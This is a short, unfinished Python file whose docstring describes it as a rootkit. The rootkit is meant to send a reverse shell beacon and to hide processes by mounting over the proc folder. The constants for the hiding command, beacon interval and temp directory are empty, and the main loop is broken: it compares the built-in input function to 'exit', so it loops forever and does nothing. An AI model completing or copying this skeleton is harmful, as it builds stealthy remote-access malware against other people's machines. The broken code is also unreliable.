from subprocess import Popen, PIPE
from socket import socket
from string import ascii_letters, digits
from os import getpid
from random import choice
from time import sleep

"""
rootkit to install on client and sends a reverse shell beacon
hides processes by mounting proc folder to a tmp directory 
"""

PROC_HIDE_CMD = f''
BEACON_INTERVAL = 0
TMP_DIR = ''

token = ''.join(choice(ascii_letters + digits) for _ in range(72))
pid = getpid()

while True:
    if input == "exit":
        break
